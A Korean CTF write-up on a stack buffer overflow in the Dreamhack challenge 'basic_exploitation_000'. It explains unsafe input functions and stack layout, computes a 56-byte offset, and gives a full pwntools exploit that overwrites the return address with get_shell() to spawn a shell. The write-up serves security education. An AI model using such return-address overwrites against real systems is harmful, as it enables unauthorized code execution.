## Concept

BOF(Buffer Overflow)는 프로그램이 버퍼에 데이터를 쓸 때 버퍼의 크기를 초과하여 인접한 메모리 영역을 덮어쓸 수 있는 취약점이다. C/C++ 계열 언어는 버퍼 크기를 자동으로 검증하지 않기 때문에, 입력값 길이를 제한하지 않으면 발생한다.

### 발생 원인

`scanf("%s", ...)`, `gets()`, `strcpy()` 같은 함수는 입력 길이를 검사하지 않아 BOF의 주요 원인이 된다. 반면 `fgets()`, `strncpy()`처럼 길이를 명시하는 함수를 사용하면 방지할 수 있다.

### 메모리 구조와의 관계

스택 프레임은 아래와 같은 구조로 배치된다.

```
[ 낮은 주소 ]
+------------------+
|      buf[]       |  <-- 사용자 입력이 쓰이는 버퍼
+------------------+
|    SFP (8byte)   |  <-- 저장된 베이스 포인터 (64비트)
+------------------+
|  Return Address  |  <-- 함수 복귀 주소
+------------------+
[ 높은 주소 ]
```

버퍼를 초과하는 입력을 넣으면 SFP와 Return Address까지 덮어쓸 수 있다. 이를 이용해 공격자는 프로그램의 실행 흐름을 원하는 방향으로 조작할 수 있다.

### 공격 방식

이 문제에서는 BOF를 이용해 Return Address를 `get_shell()` 함수의 주소로 덮어써서 셸을 획득하는 **실행 흐름 조작** 방식을 사용한다.

## 문제

`basic_exploitation_000` 문제는 BOF 취약점이 존재하는 서버에 요청을 보내 플래그를 획득하는 문제이다.

### 서비스 분석

GDB로 `main` 함수를 디스어셈블하면 다음과 같다.

![disas](/assets/img/posts/bof/rao/disas.png)

핵심 부분만 살펴보면 `sub rsp, 0x30`으로 스택에 0x30(=48)바이트의 공간을 할당하고, `lea rax, [rbp-0x30]`으로 버퍼의 시작 주소를 `scanf`의 인자로 넘긴다. 즉, `buf`의 크기는 48바이트이다. 그러나 `scanf`에 길이 제한이 없어 BOF가 발생한다.

또한 `info functions`로 심볼 목록을 확인하면 `get_shell` 함수가 존재한다.

![info functions](/assets/img/posts/bof/rao/functions.png)

`get_shell` 함수는 `0x4006aa`에 위치하며, 이 함수를 실행시키면 셸을 획득할 수 있다.

### 오프셋 계산

Return Address까지 덮어쓰기 위한 오프셋을 계산한다.

```
buf   = 0x30 (48바이트)
SFP   = 8바이트 (64비트 환경)
─────────────────────────
합계  = 56바이트  →  오프셋 = 56
```

56바이트의 더미 데이터로 `buf`와 SFP를 채운 뒤, 그 자리에 `get_shell()`의 주소를 넣으면 `main`이 반환될 때 `get_shell()`로 실행 흐름이 넘어간다.

```
[ 낮은 주소 ]
+------------------+
|   buf (48byte)   |  <-- "A" * 48
+------------------+
|   SFP (8byte)    |  <-- "A" * 8
+------------------+
|  Return Address  |  <-- p64(0x4006aa) → get_shell()
+------------------+
[ 높은 주소 ]
```

### 익스플로잇

```python
from pwn import *
context.log_level = 'debug'

p = remote("host3.dreamhack.games", 11540)

get_shell = 0x4006aa  # get_shell() 함수 주소

p.recvuntil(b"Input: ")

payload  = b"A" * 48   # buf 채우기
payload += b"A" * 8    # SFP 덮기
payload += p64(get_shell)  # Return Address → get_shell()

p.sendline(payload)

p.interactive()
```
